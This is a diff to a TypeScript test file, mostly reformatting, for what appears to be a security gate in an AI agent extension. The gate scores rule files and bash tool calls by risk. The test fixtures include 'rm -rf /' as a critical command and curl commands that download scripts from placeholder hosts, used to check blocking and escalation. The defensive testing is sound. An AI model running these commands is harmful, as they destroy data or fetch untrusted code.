@@ -577,10 +577,7 @@ test("session_before_switch block cancels the switch", async () => {
 	await pi.handlers["session_start"]({}, { cwd });
 	const { ctx } = makeCtx({ hasUI: true });
 
-	const res = await pi.handlers["session_before_switch"](
-		{ reason: "new" },
-		ctx,
-	);
+	const res = await pi.handlers["session_before_switch"]({ reason: "new" }, ctx);
 	assert.deepEqual(res, { cancel: true });
 
 	fs.rmSync(cwd, { recursive: true, force: true });
@@ -638,7 +635,10 @@ test("tools action enables and disables tools", async () => {
 	});
 	await pi.handlers["session_start"]({}, ctx);
 	const { ctx: inputCtx } = makeCtx();
-	await pi.handlers["input"]({ text: "anything", source: "interactive" }, inputCtx);
+	await pi.handlers["input"](
+		{ text: "anything", source: "interactive" },
+		inputCtx,
+	);
 	assert.deepEqual(pi.activeTools, ["read", "edit", "my_tool"]);
 
 	fs.rmSync(cwd, { recursive: true, force: true });
@@ -790,8 +790,7 @@ test("nma status shows journal entries", async () => {
 
 const CRITICAL_CMD = "rm -rf /";
 // Two downloads aggregate to medium (3*log2(3) = 5); a single one stays low.
-const MEDIUM_CMD =
-	"curl -s https://a.example/x && curl -s https://b.example/y";
+const MEDIUM_CMD = "curl -s https://a.example/x && curl -s https://b.example/y";
 
 async function boot(pi: any, files: Record<string, string>) {
 	const cwd = makeProject(files);
@@ -1017,9 +1016,7 @@ test("gate: critical frontmatter file is blocked, never prompts, never loads", a
 			(n) => /BLOCKED evil\.md/.test(n.message) && n.level === "error",
 		),
 	);
-	assert.ok(
-		notifyCalls.some((n) => /rule file\(s\) blocked/.test(n.message)),
-	);
+	assert.ok(notifyCalls.some((n) => /rule file\(s\) blocked/.test(n.message)));
 
 	const sent = listRules(pi);
 	await pi.commands["nma"].handler("", ctx);
@@ -1322,7 +1319,10 @@ test("gate: recent untracked file is nudged to high (downloaded provenance)", as
 	assert.match(confirmCalls[0][0], /^high rule file: med\.md$/); // nudged medium -> high
 
 	const raw = JSON.parse(fs.readFileSync(TRUST_FILE, "utf8"));
-	assert.equal(raw[path.resolve(cwd, ".pi/context/med.md")].provenance, "downloaded");
+	assert.equal(
+		raw[path.resolve(cwd, ".pi/context/med.md")].provenance,
+		"downloaded",
+	);
 
 	fs.rmSync(cwd, { recursive: true, force: true });
 });
@@ -1417,7 +1417,10 @@ test("barrier B: URLhaus-listed host escalates a download to critical (opt-in)",
 	try {
 		let seen = "";
 		const res = await pi.handlers["tool_call"](
-			{ toolName: "bash", input: { command: "curl -s https://listed-host.example/x.sh -o /tmp/x.sh" } },
+			{
+				toolName: "bash",
+				input: { command: "curl -s https://listed-host.example/x.sh -o /tmp/x.sh" },
+			},
 			confirmCtx({
 				confirm: async (title: string, body: string) => {
 					seen = `${title}\n${body}`;
@@ -1459,7 +1462,10 @@ test("barrier B: URL command without API key keeps deterministic behavior (no fe
 		// A lone curl download is `medium` by the deterministic scanner — it
 		// prompts exactly like before this feature existed.
 		const res = await pi.handlers["tool_call"](
-			{ toolName: "bash", input: { command: "curl -s https://nokey2.example/x.sh -o /tmp/x.sh" } },
+			{
+				toolName: "bash",
+				input: { command: "curl -s https://nokey2.example/x.sh -o /tmp/x.sh" },
+			},
 			confirmCtx({
 				confirm: async () => {
 					confirms++;
@@ -1483,9 +1489,9 @@ test("/nma status reports the active copy path", async () => {
 	const pi = makePi();
 	createExtension(pi as never);
 	let sent = "";
-	(pi as unknown as { sendMessage: (m: { content: string }) => void }).sendMessage = (
-		m,
-	) => {
+	(
+		pi as unknown as { sendMessage: (m: { content: string }) => void }
+	).sendMessage = (m) => {
 		sent = m.content;
 	};
 	await pi.commands.nma.handler("status", {
@@ -1512,23 +1518,52 @@ const importFetch =
 	async (url: string) => {
 		log.push(url);
 		if (url.includes("api.github.com")) {
-			return { ok: true, status: 200, json: async () => IMPORT_TREE, text: async () => "" };
+			return {
+				ok: true,
+				status: 200,
+				json: async () => IMPORT_TREE,
+				text: async () => "",
+			};
 		}
 		if (url.endsWith("conventional-commits/metadata.yml")) {
-			return { ok: true, status: 200, json: async () => ({}), text: async () => "author: theo\ncategory: workflow\ntags: [git, commits]\n" };
+			return {
+				ok: true,
+				status: 200,
+				json: async () => ({}),
+				text: async () =>
+					"author: theo\ncategory: workflow\ntags: [git, commits]\n",
+			};
 		}
 		if (url.endsWith("assistant-ui/metadata.yml")) {
-			return { ok: true, status: 200, json: async () => ({}), text: async () => "author: theo\ncategory: ui\ntags: [svelte]\n" };
+			return {
+				ok: true,
+				status: 200,
+				json: async () => ({}),
+				text: async () => "author: theo\ncategory: ui\ntags: [svelte]\n",
+			};
 		}
 		if (url.endsWith("/context.md")) {
-			return { ok: true, status: 200, json: async () => ({}), text: async () => "# Context\n" };
+			return {
+				ok: true,
+				status: 200,
+				json: async () => ({}),
+				text: async () => "# Context\n",
+			};
 		}
-		return { ok: false, status: 404, json: async () => ({}), text: async () => "" };
+		return {
+			ok: false,
+			status: 404,
+			json: async () => ({}),
+			text: async () => "",
+		};
 	};
 
 // index.test.ts pins NMA_NETWORK=0 at file scope; import needs network on.
 // Restores both the env var and the fetch override/cache in all cases.
-async function withRegistryFetch<T>(f: FetchLike, fn: () => Promise<T>): Promise<T> {
+async function withRegistryFetch<T>(
+	f: FetchLike,
+	fn: () => Promise<T>,
+): Promise<T> {
 	const oldNet = process.env.NMA_NETWORK;
 	process.env.NMA_NETWORK = "1";
 	setFetchForTests(f);
@@ -1746,7 +1781,10 @@ test("/nma import: existing file without UI and without --yes -> refused", async
 		JSON.stringify(logs),
 	);
 	assert.equal(
-		fs.readFileSync(path.join(cwd, ".pi/context/conventional-commits.md"), "utf8"),
+		fs.readFileSync(
+			path.join(cwd, ".pi/context/conventional-commits.md"),
+			"utf8",
+		),
 		"OLD\n",
 	);
 	fs.rmSync(cwd, { recursive: true, force: true });
@@ -1764,7 +1802,10 @@ test("/nma import: existing file with --yes -> overwritten", async () => {
 		);
 	});
 	assert.equal(
-		fs.readFileSync(path.join(cwd, ".pi/context/conventional-commits.md"), "utf8"),
+		fs.readFileSync(
+			path.join(cwd, ".pi/context/conventional-commits.md"),
+			"utf8",
+		),
 		"# Context\n",
 	);
 	fs.rmSync(cwd, { recursive: true, force: true });
@@ -1785,19 +1826,41 @@ test("/nma import: high-risk content refused when the user declines confirm", as
 			},
 		},
 	});
-	const evilFetch = (log: string[]): FetchLike => async (url: string) => {
-		log.push(url);
-		if (url.includes("api.github.com")) {
-			return { ok: true, status: 200, json: async () => IMPORT_TREE, text: async () => "" };
-		}
-		if (url.endsWith("conventional-commits/metadata.yml")) {
-			return { ok: true, status: 200, json: async () => ({}), text: async () => "author: theo\ncategory: workflow\ntags: [git]\n" };
-		}
-		if (url.endsWith("conventional-commits/context.md")) {
-			return { ok: true, status: 200, json: async () => ({}), text: async () => EVIL_MODIFY };
-		}
-		return { ok: false, status: 404, json: async () => ({}), text: async () => "" };
-	};
+	const evilFetch =
+		(log: string[]): FetchLike =>
+		async (url: string) => {
+			log.push(url);
+			if (url.includes("api.github.com")) {
+				return {
+					ok: true,
+					status: 200,
+					json: async () => IMPORT_TREE,
+					text: async () => "",
+				};
+			}
+			if (url.endsWith("conventional-commits/metadata.yml")) {
+				return {
+					ok: true,
+					status: 200,
+					json: async () => ({}),
+					text: async () => "author: theo\ncategory: workflow\ntags: [git]\n",
+				};
+			}
+			if (url.endsWith("conventional-commits/context.md")) {
+				return {
+					ok: true,
+					status: 200,
+					json: async () => ({}),
+					text: async () => EVIL_MODIFY,
+				};
+			}
+			return {
+				ok: false,
+				status: 404,
+				json: async () => ({}),
+				text: async () => "",
+			};
+		};
 	await withRegistryFetch(evilFetch([]), async () => {
 		await pi.commands["nma"].handler("import conventional-commits", ctx);
 	});
@@ -1807,7 +1870,9 @@ test("/nma import: high-risk content refused when the user declines confirm", as
 		notifyCalls.some((n) => /not imported: conventional-commits/.test(n.message)),
 		JSON.stringify(notifyCalls),
 	);
-	assert.ok(!fs.existsSync(path.join(cwd, ".pi/context/conventional-commits.md")));
+	assert.ok(
+		!fs.existsSync(path.join(cwd, ".pi/context/conventional-commits.md")),
+	);
 	fs.rmSync(cwd, { recursive: true, force: true });
 });
 
